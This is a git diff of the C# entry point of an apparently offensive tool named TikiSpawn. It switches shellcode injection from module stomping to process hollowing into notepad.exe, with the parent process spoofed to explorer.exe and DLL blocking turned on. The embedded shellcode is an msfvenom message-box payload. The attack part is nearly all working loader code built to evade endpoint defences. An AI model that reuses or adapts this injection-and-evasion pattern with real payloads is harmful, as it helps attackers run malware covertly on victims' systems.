@@ -7,7 +7,7 @@ namespace TikiSpawn
     internal static class Program
     {
         // $ msfvenom -p windows/x64/messagebox -f csharp
-        private static byte[] _shellcode =
+        private static readonly byte[] Shellcode =
         {
             0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,
             0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,
@@ -33,17 +33,15 @@ namespace TikiSpawn
         
         private static void Main(string[] args)
         {
-            var stomper = new Stomper
+            var hollower = new Hollower
             {
                 BinaryPath = @"C:\Windows\System32\notepad.exe",
                 WorkingDirectory = @"C:\Windows\System32",
-                ModuleName = "xpsservices.dll",
-                ExportName = "DllCanUnloadNow",
                 ParentId = Process.GetProcessesByName("explorer")[0].Id,
                 BlockDlls = true
             };
             
-            stomper.Stomp(_shellcode);
+            hollower.Hollow(Shellcode);
         }
     }
 }
